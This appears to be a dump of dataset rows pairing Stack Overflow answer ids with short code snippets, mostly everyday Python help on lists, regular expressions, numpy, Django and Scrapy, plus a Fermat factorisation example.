</snippet></ROW><ROW><id>20460443</id><snippet>%i</snippet></ROW><ROW><id>20460443</id><snippet>int</snippet></ROW><ROW><id>20460443</id><snippet>%p</snippet></ROW><ROW><id>20460443</id><snippet>IP</snippet></ROW><ROW><id>20460443</id><snippet>PORT</snippet></ROW><ROW><id>20460443</id><snippet>%i</snippet></ROW><ROW><id>20460443</id><snippet>%p</snippet></ROW><ROW><id>20460443</id><snippet>%</snippet></ROW><ROW><id>20460443</id><snippet>*f</snippet></ROW><ROW><id>20460443</id><snippet>system</snippet></ROW><ROW><id>20460452</id><snippet>View</snippet></ROW><ROW><id>20460452</id><snippet>Windows and toolbars</snippet></ROW><ROW><id>20460452</id><snippet>Console</snippet></ROW><ROW><id>20460452</id><snippet>IPython console</snippet></ROW><ROW><id>20460452</id><snippet>cmd.exe</snippet></ROW><ROW><id>20460452</id><snippet>Start &gt; Run</snippet></ROW><ROW><id>20460452</id><snippet>spyder --reset
</snippet></ROW><ROW><id>20460510</id><snippet>2013-12-08 22:42:12+0000 [-]   File "/usr/lib/python2.7/json/decoder.py", line 383, in raw_decode
2013-12-08 22:42:12+0000 [-]     raise ValueError("No JSON object could be decoded")
2013-12-08 22:42:12+0000 [-] exceptions.ValueError: No JSON object could be decoded
</snippet></ROW><ROW><id>20460510</id><snippet>json</snippet></ROW><ROW><id>20460510</id><snippet>2013-12-08 22:42:12+0000 [-]   File "irctwitch.py", line 60, in getTwitchStatus
2013-12-08 22:42:12+0000 [-]     data = requests.get("http://api.justin.tv/api/stream/list.json?channel=" + channel).json()
</snippet></ROW><ROW><id>20460510</id><snippet>.json()</snippet></ROW><ROW><id>20460510</id><snippet>requests.get()</snippet></ROW><ROW><id>20460510</id><snippet>.json()</snippet></ROW><ROW><id>20460523</id><snippet>line_words</snippet></ROW><ROW><id>20460523</id><snippet>for</snippet></ROW><ROW><id>20460523</id><snippet>for line_words in lines_words:
    print (line_words)
</snippet></ROW><ROW><id>20460523</id><snippet>line_words</snippet></ROW><ROW><id>20460523</id><snippet>for line in lines_words:
    print (line)
</snippet></ROW><ROW><id>20460523</id><snippet>for line in line_words:
    txt = replace_all(line, reps)
    print (txt)
</snippet></ROW><ROW><id>20460523</id><snippet>line_words</snippet></ROW><ROW><id>20460618</id><snippet>class MyDia(QtGui.QDialog, Dlg): 
    def __init__(self): 
        QtGui.QDialog.__init__(self)
... 
        self.setupUi(self)
self.connect(self.buttonOK, 
                QtCore.SIGNAL("clicked()"), self.onOK)# the button signal
    def onOK(self):#event when user clicks
        list=np.zeros((1,16))
        for i in range(0,16,1):               
               list[0,i]= float(self.tableWidget.item(0,i).text())
               #reads in the first row the User has input before
</snippet></ROW><ROW><id>20460622</id><snippet>'C:\Users\tom\Desktop\PythonScripts\charList.txt'</snippet></ROW><ROW><id>20460622</id><snippet>charList.txt</snippet></ROW><ROW><id>20460622</id><snippet>os.listdir('C:\\Users\\tom\\Desktop\\PythonScripts')
</snippet></ROW><ROW><id>20460622</id><snippet>listdir</snippet></ROW><ROW><id>20460667</id><snippet>from collections import deque
from itertools import islice, dropwhile
import csv

def iscomment(row): return row[0][0] == '#'

with gzip.open(sys.argv[1], 'r') as f:
    reader = dropwhile(iscomment, csv.reader(f, delimiter="\t"))
    history = deque(islice(reader, 2), maxlen=2)

    for row in reader:      
        if history[-1][1] in myHdictionary:
            print history[0]
            print history[-1]
            print row
        history.append(row)
</snippet></ROW><ROW><id>20460667</id><snippet>csv.reader()</snippet></ROW><ROW><id>20460667</id><snippet>dropwhile()</snippet></ROW><ROW><id>20460667</id><snippet>csv</snippet></ROW><ROW><id>20460667</id><snippet>deque</snippet></ROW><ROW><id>20460667</id><snippet>history[-1]</snippet></ROW><ROW><id>20460667</id><snippet>history[0]</snippet></ROW><ROW><id>20460667</id><snippet>history[-1]</snippet></ROW><ROW><id>20460667</id><snippet>myHdictionary</snippet></ROW><ROW><id>20460739</id><snippet>__init__</snippet></ROW><ROW><id>20460739</id><snippet>def a():
    print("Hello!")

def b(fun):
    print("running fun")
    fun()
    print("all done")

b(a) # prints "running fun", then "Hello!", then "all done".
</snippet></ROW><ROW><id>20460739</id><snippet>class c(object):
    def __init__(self, fun):
        self.fun = fun
        self.fun()
</snippet></ROW><ROW><id>20460739</id><snippet>lambda</snippet></ROW><ROW><id>20460739</id><snippet>def d(fun, num):
    return fun(num)

def e(x):
    return x**2

d(lambda x: x**2, 7) # Returns 49
d(e) # Also returns 49
</snippet></ROW><ROW><id>20460860</id><snippet>from scrapy.spider import BaseSpider

class DmozSpider(BaseSpider):
    name = "dmoz"
    allowed_domains = ["dmoz.org"]
    start_urls = [
        "http://www.dmoz.org/Computers/Programming/Languages/Python/Books/",
        "http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/"
    ]

    def parse(self, response):
        filename = response.url.split("/")[-2]
        open(filename, 'wb').write(response.body)
</snippet></ROW><ROW><id>20460926</id><snippet>if len(word_one) == len(word_two):
    return sum(c!=d for c,d in zip(word_one, word_two)) == 1
return False   # optional - often None will do instead
</snippet></ROW><ROW><id>20460926</id><snippet>import operator
def differ(w1, w2):
    return len(w1) == len(w2) and sum(map(operator.ne, w1, w2)) == 1
</snippet></ROW><ROW><id>20460926</id><snippet>sum</snippet></ROW><ROW><id>20460926</id><snippet>import operator, itertools
def differ(w1, w2):
    it = itertools.imap(operator.ne, w1, w2)
    return len(w1) == len(w2) and any(it) and not any(it)
</snippet></ROW><ROW><id>20461035</id><snippet>mask = (feature_series &gt; 10) | (feature_series &lt; 10)
</snippet></ROW><ROW><id>20461188</id><snippet>cd /root/of/scrapy/project/where/scrapy.cfg/is
scrapy deploy
</snippet></ROW><ROW><id>20461188</id><snippet>[deploy:scrapyd2]
url = http://scrapyd.mydomain.com/api/scrapyd/
username = john
password = secret
</snippet></ROW><ROW><id>20461206</id><snippet>df[ 'index1' ] = df.index
</snippet></ROW><ROW><id>20461206</id><snippet>df.reset_index( level=0, inplace=True )
</snippet></ROW><ROW><id>20461369</id><snippet>en_list</snippet></ROW><ROW><id>20461369</id><snippet>espeak-1.47.11-source.zip</snippet></ROW><ROW><id>20461369</id><snippet>espeak-1.47.11-source/dictsource</snippet></ROW><ROW><id>20461369</id><snippet>en_list</snippet></ROW><ROW><id>20461369</id><snippet>inc Insi:dEnt
</snippet></ROW><ROW><id>20461369</id><snippet>en_dict</snippet></ROW><ROW><id>20461369</id><snippet>/usr/lib/x86_64-linux-gnu/espeak-data/en_dict</snippet></ROW><ROW><id>20461369</id><snippet>$ sudo espeak --compile English
</snippet></ROW><ROW><id>20461505</id><snippet>split()</snippet></ROW><ROW><id>20461505</id><snippet>test = a[0].split()
result = [test[0], " ".join(test[1:-1]), test[-1]]
</snippet></ROW><ROW><id>20461505</id><snippet>-1</snippet></ROW><ROW><id>20461505</id><snippet>[a[0].split()[0], " ".join(a[0].split()[1:-1]), a[0].split()[-1]]
</snippet></ROW><ROW><id>20461505</id><snippet>import re
a = 'hello there good friend'
return re.split(' (.*) ', a)
&gt;&gt;&gt; ['hello', 'there good', 'friend']
</snippet></ROW><ROW><id>20461505</id><snippet>O(n)</snippet></ROW><ROW><id>20461505</id><snippet># gnibbler's tuple solution
&gt;&gt;&gt; timeit.timeit("s='hello there good friend';i1=s.find(' ');i2=s.rfind(' ');s[:i1], s[i1+1:i2], s[i2+1:]", number=100000)
0.0976870059967041

# gnibbler's list solution
&gt;&gt;&gt; timeit.timeit("s='hello there good friend';i1=s.find(' ');i2=s.rfind(' ');[s[:i1], s[i1+1:i2], s[i2+1:]]", number=100000)
0.10682892799377441

# my first solution
&gt;&gt;&gt; timeit.timeit("a='hello there good friend'.split();[a[0], ' '.join(a[1:-1]), a[-1]]", number=100000)
0.12330794334411621

# regex solution
&gt;&gt;&gt; timeit.timeit("re.split(' (.*) ', 'hello there good friend')", "import re", number=100000)
0.27667903900146484
</snippet></ROW><ROW><id>20461507</id><snippet>A</snippet></ROW><ROW><id>20461507</id><snippet>B</snippet></ROW><ROW><id>20461507</id><snippet>for</snippet></ROW><ROW><id>20461507</id><snippet># say A &amp; B are like this:
n, N = 3, 5
A = np.array( np.random.randn(N, N ) )

B = np.zeros_like( A )
B[ n ] = np.random.randn( N )
B[:, n] = np.random.randn( N )
</snippet></ROW><ROW><id>20461507</id><snippet>rowb, colb = B[n,:], np.copy( B[:,n] )
colb[ n ] = 0
</snippet></ROW><ROW><id>20461507</id><snippet>A</snippet></ROW><ROW><id>20461507</id><snippet>X = np.outer( A[:,n], rowb )
X[:,n] += np.dot( A, colb )
</snippet></ROW><ROW><id>20461507</id><snippet>X - np.dot( A, B )
</snippet></ROW><ROW><id>20461507</id><snippet>N=100</snippet></ROW><ROW><id>20461507</id><snippet>%timeit np.dot(A, B)
1000 loops, best of 3: 1.39 ms per loop

%timeit colb = np.copy( B[:,n] ); colb[ n ] = 0; X = np.outer( A[:,n], B[n,:] ); X[:,n] += np.dot( A, colb )
10000 loops, best of 3: 98.5 µs per loop
</snippet></ROW><ROW><id>20461514</id><snippet>lines_of_text = [
    (12345, 1312,  'Teso', 'Billy',  'Jones'),
    (12344, 30000, 'Test', 'John M', 'Smith')
]

for mytuple in lines_of_text:
    name = '{}, {}'.format(mytuple[4], mytuple[3])
    value = '£' + str(mytuple[1])
    print('{name:&lt;20} {id:&gt;8} {test:&lt;12} {value:&gt;8}'.format(
        name=name, id=mytuple[0], test=mytuple[2], value=value)
    )
</snippet></ROW><ROW><id>20461514</id><snippet>Jones, Billy            12345 Teso           £1312
Smith, John M           12344 Test          £30000
</snippet></ROW><ROW><id>20461532</id><snippet>film_list=['title','article_size','producer','release_date','running_time','country','budget']
flist = [(i,j) for i, j in enumerate(film_list)]
label = [ seq[0] for seq in flist ]
name = [ seq[1] for seq in flist ]
print label 
print name

&gt;&gt;[0, 1, 2, 3, 4, 5, 6]
['title', 'article_size', 'producer', 'release_date', 'running_time', 'country', 'budget']
</snippet></ROW><ROW><id>20461532</id><snippet>labels = film_1.keys()
print labels

# But the keys are sorted, labels[0] will give you 'producer' instead of 'title':
&gt;&gt;['producer', 'title', 'country', 'release_date', 'budget', 'article_size', 'running_time']
</snippet></ROW><ROW><id>20461743</id><snippet>_</snippet></ROW><ROW><id>20461743</id><snippet>for _ in range(n):
  stuff
</snippet></ROW><ROW><id>20461821</id><snippet>action</snippet></ROW><ROW><id>20461821</id><snippet>clockwise_action</snippet></ROW><ROW><id>20461821</id><snippet>counterclockwise_action</snippet></ROW><ROW><id>20461829</id><snippet>words = [str(cell.value) for cell in Table.col(0)] #list comprehension
abbr = [str(cell.value) for cell in Table.col(1)]
replacements = zip(words, abbr)
</snippet></ROW><ROW><id>20461829</id><snippet>import re
def multiple_replacer(*key_values):
    replace_dict = dict(key_values)
    replacement_function = lambda match: replace_dict[match.group(0)]
    pattern = re.compile("|".join([re.escape(k) for k, v in key_values]))
    return lambda string: pattern.sub(replacement_function, string)
</snippet></ROW><ROW><id>20461829</id><snippet>replaceFunc = multiple_replacer(*replacements) #constructs the function. Do this outside the loop, after the replacements have been gathered.
myString = replaceFunc(myString) 
</snippet></ROW><ROW><id>20461852</id><snippet>def make_rows(list_of_int, num_per_row):
    new_list = []
    count = 0
    new_inner_list = []
    for n in list_of_int:
        count += 1
        new_inner_list.append(n)
        if (count == num_per_row):
            new_list.append(new_inner_list)
            new_inner_list = []
            count = 0
    return new_list
</snippet></ROW><ROW><id>20461857</id><snippet>str.startswith</snippet></ROW><ROW><id>20461857</id><snippet>if link.lower().startswith(("js", "catalog", "script", "scripts", "katalog")):
</snippet></ROW><ROW><id>20461994</id><snippet>entry_points</snippet></ROW><ROW><id>20461994</id><snippet>def main():
    print "Hello world"
</snippet></ROW><ROW><id>20461994</id><snippet>from setuptools import setup

setup(
    name="foo",
    version = "0.1",
    py_modules=['foo'],
    entry_points = {
        'console_scripts': ['foo = foo:main']
    }
)
</snippet></ROW><ROW><id>20461994</id><snippet>pip</snippet></ROW><ROW><id>20461994</id><snippet>$ foo
Hello world
$ python -c 'import foo; foo.main()'
Hello world
</snippet></ROW><ROW><id>20461998</id><snippet>with open('path/to/input') as infile:
  words = []
  for line in infile:
    words.append(line.strip()[::-1])

with open('path/to/output', 'w') as outfile:
  for word in words[::-1]:
    outfile.write(word)
    outfile.write('\n')
</snippet></ROW><ROW><id>20461998</id><snippet>with open('path/to/input') as infile:
  words = [line.strip()[::-1] for line in infile]

with open('path/to/output', 'w') as outfile:
  outfile.write('\n'.join(words[::-1]))
</snippet></ROW><ROW><id>20462003</id><snippet>python setup.py install</snippet></ROW><ROW><id>20462568</id><snippet>months = ["jan", "feb", "mar", ... ]
</snippet></ROW><ROW><id>20462568</id><snippet>def lowest():
    low = min(year)
    month = months[year.index(low)]
    print ...
</snippet></ROW><ROW><id>20462573</id><snippet>a * b[..., np.newaxis]
</snippet></ROW><ROW><id>20462573</id><snippet>b</snippet></ROW><ROW><id>20462808</id><snippet>y, s = [ ], set( )
for t in x:
    w = tuple( sorted( t ) )
    if not w in s:
        y.append( t )
        s.add( w )
</snippet></ROW><ROW><id>20462808</id><snippet>x = [[1,2],[3,4],[5,6],[2,1,1],[2,1],[7,8],[4,3],[1,2,1]]
</snippet></ROW><ROW><id>20462808</id><snippet>y</snippet></ROW><ROW><id>20462808</id><snippet>[[1, 2], [3, 4], [5, 6], [2, 1, 1], [7, 8]]
</snippet></ROW><ROW><id>20462842</id><snippet>str.replace</snippet></ROW><ROW><id>20462842</id><snippet>re.sub</snippet></ROW><ROW><id>20462842</id><snippet>&gt;&gt;&gt; re.sub(r'\(.*\)', '', 'foobar (###)')
'foobar '
</snippet></ROW><ROW><id>20462926</id><snippet>a &gt; b ? c : d</snippet></ROW><ROW><id>20462926</id><snippet>print (c if a &gt; b else d),
</snippet></ROW><ROW><id>20463043</id><snippet>dict</snippet></ROW><ROW><id>20463043</id><snippet>def value():
    hand_total = 0
    # Add in a dict of "rank values" (excluding the Ace)
    rank_values = {'2':2, '3':3, '4':4, '5':5, '6':6, '7':7, '8':8,
                   '9':9, '10':10, 'J':10, 'Q':10, 'K':10}
    # No need for the while loop 
    for i in xrange(len(player1_hand)):
        card = player1_hand[i][0] # the added index will get the card          
        if card == 'A':          # without the suit.
            print "Please choose between 1 and 11."
            value_a = input("---&gt; ")
            hand_total += int(value_a) # add a type check before this
        else:
            hand_total += rank_values[card]
    return hand_total
</snippet></ROW><ROW><id>20463043</id><snippet>dict</snippet></ROW><ROW><id>20463138</id><snippet>Environment.NewLine</snippet></ROW><ROW><id>20463138</id><snippet>\r\n</snippet></ROW><ROW><id>20463138</id><snippet>string patterns = @"
ATGCG
GCATG
CATGC
AGGCA
GGCAT";
</snippet></ROW><ROW><id>20463138</id><snippet>var elems = patterns.Split(new[] { Environment.NewLine }, StringSplitOptions.RemoveEmptyEntries);
</snippet></ROW><ROW><id>20463191</id><snippet>[^&gt;]*</snippet></ROW><ROW><id>20463191</id><snippet>&gt;</snippet></ROW><ROW><id>20463191</id><snippet>re.search('&lt;label([^&gt;]*)&gt;','&lt;label title=&gt;') # matches
re.search('&lt;label([^&gt;]*)&gt;','&lt;label&gt;') # matches
</snippet></ROW><ROW><id>20463369</id><snippet>0</snippet></ROW><ROW><id>20463369</id><snippet>increment</snippet></ROW><ROW><id>20463369</id><snippet>0</snippet></ROW><ROW><id>20463369</id><snippet>speed</snippet></ROW><ROW><id>20463369</id><snippet>for hour in range(0, hour, increment):
    distance = speed * hour
    print(hour, '\t' , distance)
</snippet></ROW><ROW><id>20463369</id><snippet>for hour in range(increment, hour+increment, increment):
    distance = speed * hour
    print(hour, '\t' , distance)
</snippet></ROW><ROW><id>20463382</id><snippet>download-cache</snippet></ROW><ROW><id>20463382</id><snippet>~/.pip.conf</snippet></ROW><ROW><id>20463382</id><snippet>[global]
default-timeout = 60
respect-virtualenv = true
download-cache = /home/foo/bar/.pip/cache
log-file = /home/foo/bar/.pip/pip.log
build = /home/foo/bar/.pip/build

[install]
use-mirrors = true
</snippet></ROW><ROW><id>20463402</id><snippet>grep</snippet></ROW><ROW><id>20463402</id><snippet>sed</snippet></ROW><ROW><id>20463402</id><snippet>awk</snippet></ROW><ROW><id>20463402</id><snippet>#! /usr/bin/env python

import re
import subprocess
import sys

TARGET_FILE = "linux-2.6.0.tar.xz"
TARGET_LINK = "http://www.kernel.org/pub/linux/kernel/v2.6/%s" % TARGET_FILE

wgetExecutable = '/usr/bin/wget'
wgetParameters = ['--progress=dot', TARGET_LINK]

wgetPopen = subprocess.Popen([wgetExecutable] + wgetParameters,
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT)

for line in iter(wgetPopen.stdout.readline, b''):
    match = re.search(r'\d+%', line)
    if match:
        print '\b\b\b\b' + match.group(0),

wgetPopen.stdout.close()
wgetPopen.wait()
</snippet></ROW><ROW><id>20463490</id><snippet>myLine = f.readline()
</snippet></ROW><ROW><id>20463490</id><snippet>myLine</snippet></ROW><ROW><id>20463490</id><snippet>myList = list(f)
</snippet></ROW><ROW><id>20463628</id><snippet>%s</snippet></ROW><ROW><id>20463628</id><snippet>.execute("INSERT INTO table VALUES(%s,%s)", (int(id), string)
</snippet></ROW><ROW><id>20463953</id><snippet>[00|06|12|18]</snippet></ROW><ROW><id>20463953</id><snippet>00|06|12|18</snippet></ROW><ROW><id>20463953</id><snippet>210000</snippet></ROW><ROW><id>20463953</id><snippet>[00|06|12|18]</snippet></ROW><ROW><id>20463953</id><snippet>r'(00|06|12|18)0000'
</snippet></ROW><ROW><id>20463953</id><snippet>r'(?&lt;=00|06|12|18)0000'
</snippet></ROW><ROW><id>20464245</id><snippet>def upload_job_file_path(instance, filename):
    return 'uploads/job_meta/files/%s/%s' % (instance.job_id, filename)


class JobFileSubmit(models.Model):
    job = models.ForeignKey(Jobs)
    user = models.ForeignKey(User)
    file = models.FileField(upload_to=upload_job_file_path, blank=False, null=False)
    uploadDate = models.DateTimeField(auto_now=True)
</snippet></ROW><ROW><id>20464245</id><snippet>if fileform.is_valid():
    jfs = fileform.save(commit=True)
</snippet></ROW><ROW><id>20464345</id><snippet>pip install &lt;package_name&gt;    
</snippet></ROW><ROW><id>20464345</id><snippet>python-Levenshtein</snippet></ROW><ROW><id>20464425</id><snippet>sorted_items = sorted(d.items(), key = lambda item : len(item[1]))
newd = dict(sorted_items[-2:])
</snippet></ROW><ROW><id>20464869</id><snippet># get our initial input:
n = input()
result = int(n)

# subtract the rest of the user's inputs:
for x in range(9):
    n = input()
    result -= int(n)

# ... do something with the result ...
</snippet></ROW><ROW><id>20465118</id><snippet>class F():
    def __init__(self):
        self.name = 'F'
    def calltest(self, g, obj_name):
        obj = g.get(obj_name)
        if obj is None:
            raise ValueError("OBJ is not there!")
        obj.test()
</snippet></ROW><ROW><id>20465118</id><snippet>f_obj = F()
f_obj.calltest(globals(), 'CB')
</snippet></ROW><ROW><id>20465181</id><snippet>#from math import ceil

def isqrt(n):
  x = n
  y = (x + n // x) // 2
  while y &lt; x:
    x = y
    y = (x + n // x) // 2
  return x

def fermat(n, verbose=True):
    a = isqrt(n) # int(ceil(n**0.5))
    b2 = a*a - n
    b = isqrt(n) # int(b2**0.5)
    count = 0
    while b*b != b2:
        if verbose:
            print('Trying: a=%s b2=%s b=%s' % (a, b2, b))
        a = a + 1
        b2 = a*a - n
        b = isqrt(b2) # int(b2**0.5)
        count += 1
    p=a+b
    q=a-b
    assert n == p * q
    print('a=',a)
    print('b=',b)
    print('p=',p)
    print('q=',q)
    print('pq=',p*q)
    return p, q

n=103591*104729
fermat(n)
</snippet></ROW><ROW><id>20465181</id><snippet>&gt;&gt;&gt; fermat(5959)
Trying: a=78 b2=125 b=11
Trying: a=79 b2=282 b=16
a= 80
b= 21
p= 101
q= 59
pq= 5959
(101, 59)
</snippet></ROW><ROW><id>20465181</id><snippet>&gt;&gt;&gt; fermat(103591*104729)
Trying: a=104159 b2=115442 b=339
a= 104160
b= 569
p= 104729
q= 103591
pq= 10848981839
(104729, 103591)
</snippet></ROW><ROW><id>20465181</id><snippet>n_long=316033277426326097045474758505704980910037958719395560565571239100878192955228495343184968305477308460190076404967552110644822298179716669689426595435572597197633507818204621591917460417859294285475630901332588545477552125047019022149746524843545923758425353103063134585375275638257720039414711534847429265419

fermat(n_long, verbose=False)
a= 17777324810733646969488445787976391269105128850805128551409042425916175469326288448917184096591563031034494377135896478412527365012246902424894591094668262
b= 157517855001095328119226302991766503492827415095855495279739107269808590287074235
p= 17777324810733646969488445787976391269105128850805128551409042425916175469483806303918279424710789334026260880628723893508382860291986009694703181381742497
q= 17777324810733646969488445787976391269105128850805128551409042425916175469168770593916088768472336728042727873643069063316671869732507795155086000807594027
pq= 316033277426326097045474758505704980910037958719395560565571239100878192955228495343184968305477308460190076404967552110644822298179716669689426595435572597197633507818204621591917460417859294285475630901332588545477552125047019022149746524843545923758425353103063134585375275638257720039414711534847429265419
</snippet></ROW><ROW><id>20465669</id><snippet>x.count(tag) for x in data
</snippet></ROW><ROW><id>20465669</id><snippet>Counter</snippet></ROW><ROW><id>20465669</id><snippet>defaultdict(int)</snippet></ROW><ROW><id>20465669</id><snippet>Counter</snippet></ROW><ROW><id>20465669</id><snippet>defaultdict(int)</snippet></ROW><ROW><id>20465669</id><snippet>Counter</snippet></ROW><ROW><id>20465669</id><snippet>import collections
import itertools
tag_counts = collections.Counter(itertools.chain.from_iterable(data))
tag_to_weight_dict = {tag: weight_function(count)
                      for tag, count in tag_counts.items()}
</snippet></ROW><ROW><id>20465705</id><snippet>&gt;&gt;&gt; d = {i+1:v for i,v in enumerate(zip(minValueRange, maxValueRange))}
&gt;&gt;&gt; d
{1: (512, 550.0),
 2: (550.0, 600.0),
 3: (600.0, 650.0),
 4: (650.0, 700.0),
 5: (700.0, 750.0),
 6: (750.0, 755)}
</snippet></ROW><ROW><id>20465705</id><snippet>&gt;&gt;&gt; for k,v in d.iteritems():
...    print('{} {} {};'.format(v[0], v[1], k))
...
512 550.0 1;
550.0 600.0 2;
600.0 650.0 3;
650.0 700.0 4;
700.0 750.0 5;
750.0 755 6;
</snippet></ROW><ROW><id>20465705</id><snippet>&gt;&gt;&gt; ''.join('{} {} {};'.format(v[0], v[1], k) for k,v in d.iteritems())
'512 550.0 1;550.0 600.0 2;600.0 650.0 3;650.0 700.0 4;700.0 750.0 5;750.0 755 6;'
</snippet></ROW><ROW><id>20465705</id><snippet>&gt;&gt;&gt; ''.join('{} {} {};'.format(v[0], v[1], k+1) for k,v in enumerate(zip(minValueRange, maxValueRange)))
'512 550.0 1;550.0 600.0 2;600.0 650.0 3;650.0 700.0 4;700.0 750.0 5;750.0 755 6;'
</snippet></ROW><ROW><id>20465821</id><snippet>##bind context=context
</snippet></ROW><ROW><id>20466201</id><snippet>import lxc

container = lxc.Container("Test")
container.start()
if container.wait("RUNNING", timeout=5)
   container.stop()
   container.destroy()
</snippet></ROW><ROW><id>20466520</id><snippet>[SoapDocumentMethod(ParameterStyle=SoapParameterStyle.Bare)]
</snippet></ROW><ROW><id>20466520</id><snippet>_style</snippet></ROW><ROW><id>20466520</id><snippet>@soap(..., _style='document')
</snippet></ROW><ROW><id>20466520</id><snippet>%sResult</snippet></ROW><ROW><id>20466520</id><snippet>_soap_body_style='bare'</snippet></ROW><ROW><id>20466665</id><snippet>"%.2d"</snippet></ROW><ROW><id>20466665</id><snippet>"%.2f"</snippet></ROW><ROW><id>20466665</id><snippet>class Point(object):
    def __init__(self, x=0.0, y=0.0):
        self.x = x
        self.y = y

    def __str__(self):
        return '{0:.2f}, {1:.2f}'.format(self.x, self.y)

    def print_point(self):
        print('%.1d , %1.d' % (self.x, self.y))


a = Point()
b = Point(1.2, 4.5)

print(a)
print(b)
</snippet></ROW><ROW><id>20466665</id><snippet>0.00, 0.00
1.20, 4.50
</snippet></ROW><ROW><id>20466754</id><snippet>klasse</snippet></ROW><ROW><id>20466754</id><snippet>class klasse(object):

    #  name = [] if this was the case, the name would be a class variable, 
    #  and all instances would share it

    def __init__(self, value):
        self.name = [] #  but now it is a separate for each instance
        self.add_name(value)

    def add_name(self, value):
        self.name.append(str(value))
</snippet></ROW><ROW><id>20467287</id><snippet>requests</snippet></ROW><ROW><id>20467635</id><snippet>soft_row_obj = EpSoftData.objects.update()
</snippet></ROW><ROW><id>20467695</id><snippet>{{ form.errors }}</snippet></ROW><ROW><id>20467695</id><snippet>name</snippet></ROW><ROW><id>20467695</id><snippet>input</snippet></ROW><ROW><id>20467695</id><snippet>{{ form.title.label_tag }}
{{ form.title }}
{{ form.title.errors }}
</snippet></ROW><ROW><id>20467695</id><snippet>isbn</snippet></ROW><ROW><id>20467695</id><snippet>pages</snippet></ROW><ROW><id>20467695</id><snippet>blank=False</snippet></ROW><ROW><id>20467695</id><snippet>exclude</snippet></ROW><ROW><id>20467695</id><snippet>null=False</snippet></ROW><ROW><id>20467695</id><snippet>pages</snippet></ROW><ROW><id>20467695</id><snippet>&lt;form&gt;</snippet></ROW><ROW><id>20467695</id><snippet>{{ form.as_p }}</snippet></ROW><ROW><id>20467699</id><snippet>{{ dept.name.0 }}</snippet></ROW><ROW><id>20467706</id><snippet>flask</snippet></ROW><ROW><id>20467706</id><snippet>bottle</snippet></ROW><ROW><id>20468105</id><snippet>#!/usr/bin/env python

    class Calculator:
        def __init__(self,x,y):
            self.x = int(x)
            self.y = int(y)
        def add(self):
            return self.x + self.y
        def sub(self):
            return self.x - self.y
        def multi(self):
            return self.x * self.y
        def div(self):
            return self.x / self.y

        def convert(self,a,b):
            try:
                int_a = int(a)
                int_b = int(b)
            except ValueError:
                int_a = float(a)
                int_b = float(b)
            return int_a,int_b

    run = True

    while run:
        print "Please choose what you'd like to do:"
        print "0: Addition"
        print "1: Subtraction"
        print "2: Multiplication"
        print "3: Division"
        print "4: Quit Application"

        choice = raw_input()

        if choice == "0":
            str_a = raw_input("Enter 1st number : ")
            str_b = raw_input("Enter 2nd number : ")
            c = Calculator(str_a,str_b)
            print c.add()
</snippet></ROW><ROW><id>20468193</id><snippet>sizeHint()</snippet></ROW><ROW><id>20468193</id><snippet>QSize</snippet></ROW><ROW><id>20468193</id><snippet>def sizeHint( self ):
    return QSize( 200, 200 )
</snippet></ROW><ROW><id>20468328</id><snippet>render_to_string</snippet></ROW><ROW><id>20468328</id><snippet>import os
from django.template.loader import render_to_string

class FooClass(object):
    def render(self):
       return render_to_string(os.path.basename(self._template),
                               self._template_variables)
</snippet></ROW><ROW><id>20468328</id><snippet>basename</snippet></ROW><ROW><id>20468328</id><snippet>render_to_string</snippet></ROW><ROW><id>20468377</id><snippet>N=10</snippet></ROW><ROW><id>20468377</id><snippet>Table.where()</snippet></ROW><ROW><id>20468377</id><snippet>Table.read_where()</snippet></ROW><ROW><id>20468377</id><snippet>cond = ("col0 == 'blue' | col1 == 'blue' | col2 == 'blue' | col3 == 'blue' | "
        "col4 == 'blue' | col5 == 'blue' | col6 == 'blue' | col7 == 'blue' | "
        "col8 == 'blue' | col9 == 'blue'")
rows = [row[:] for row in table.where(cond)]
</snippet></ROW><ROW><id>20468377</id><snippet>cond</snippet></ROW><ROW><id>20468377</id><snippet>cond = " | ".join(["col{0} == 'blue'".format(i) for i in range(10)])
</snippet></ROW><ROW><id>20468377</id><snippet>labels = ['', 'blue', 'red', 'yellow', ...]
labels_to_idx = dict(zip(labels, range(len(labels))))
cond = " | ".join(["col{0} == '{1}'".format(i, labels_to_idx['blue']) 
                   for i in range(10)])
rows = [[labels[x] for x in row[:]] for row in table.where(cond)]
</snippet></ROW><ROW><id>20468423</id><snippet>import re
pattern = r'([\,|\.]\d{1}$)'
string = 'Some string .1\n'
rep = r'\g&lt;1&gt;0'
re.sub(pattern, rep, string)
&gt; 'Some string .10\n'
</snippet></ROW><ROW><id>20468562</id><snippet>File</snippet></ROW><ROW><id>20468562</id><snippet>obj = form.save(commit=False)
# [...] your encryption stuff [...]
obj.some_file_field = ContentFile(secret.serialize(), uuid.uuid4().get_hex())
obj.save()
form.save_m2m()
</snippet></ROW><ROW><id>20468562</id><snippet>TemporaryUploadedFile</snippet></ROW><ROW><id>20468650</id><snippet>@classmethod
def __import_something_from_xml(cls, data):
    #logic
    return a, b, c
</snippet></ROW><ROW><id>20468650</id><snippet>@classmethod
def from_xml(cls, xml_file):
    x, y, z  = cls.__import_something_from_xml(xml_file)
    return cls(x,y,z)
</snippet></ROW><ROW><id>20468650</id><snippet>class XMLDataHelper:
    @staticmethod
    def import_something_from_xml(data):
        #logic
        return a, b, c
</snippet></ROW><ROW><id>20468650</id><snippet>@classmethod
def from_xml(cls, xml_file):
    x, y, z  = XMLDataHelper.import_something_from_xml(xml_file)
    return cls(x,y,z)
</snippet></ROW><ROW><id>20468849</id><snippet>some_var = None  # In any non-abstract versions of this class, this must be set</snippet></ROW><ROW><id>20468849</id><snippet>some_var = None  # Still None, doesn't make sense for this var to be set to anything</snippet></ROW><ROW><id>20468849</id><snippet>__init__</snippet></ROW><ROW><id>20468849</id><snippet>MyBaseClass.__init__ = lambda self: None</snippet></ROW><ROW><id>20468871</id><snippet>&gt;&gt;&gt; for hits in data['hits']['hits']:
...     print hits['_source']['volume']
...
557462
562559
</snippet></ROW><ROW><id>20468871</id><snippet>&gt;&gt;&gt; from operator import itemgetter
&gt;&gt;&gt; map(itemgetter('volume'), map(itemgetter('_source'), data['hits']['hits']))
[557462, 562559]
</snippet></ROW><ROW><id>20468947</id><snippet>import numpy as np

dtype=[('name', object), ('score', int)]
data = np.loadtxt('nouns.txt', delimiter=',', dtype=dtype)
data.sort(order='score')
print data
</snippet></ROW><ROW><id>20468968</id><snippet>for p in range(1, 100):
    ...
        if pixel_counter[p-2] &gt; pixel_counter[p-1]:
            continue
        else: 
            break
        ... dead code ...
